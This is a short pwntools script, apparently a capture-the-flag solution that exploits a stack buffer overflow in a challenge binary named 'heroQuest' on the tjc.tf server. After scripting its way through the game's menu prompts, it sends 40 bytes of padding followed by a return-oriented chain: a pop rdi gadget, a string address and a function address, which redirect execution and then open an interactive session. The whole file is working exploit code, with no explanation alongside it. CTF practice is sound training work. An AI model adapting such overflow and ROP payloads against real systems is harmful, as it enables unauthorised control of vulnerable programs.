from pwn import *
p=remote("tjc.tf",31365)
#p=process("./heroQuest")
p.sendlineafter(b'save file! ',b'son')
p.sendlineafter(b'(w)est. ',b'w')
p.sendlineafter(b'(g)o back ',b'r')
pop_rdi=0x00000000004017ab
addr_str_finalBoss=0x4025fb
fight_addr=0x4014db
payload=b'a'*40+p64(0x00000000004017ab)+p64(0x4025fb)+p64(0x4014db)
#input()
p.sendlineafter(b'save file: ',payload)
p.interactive()
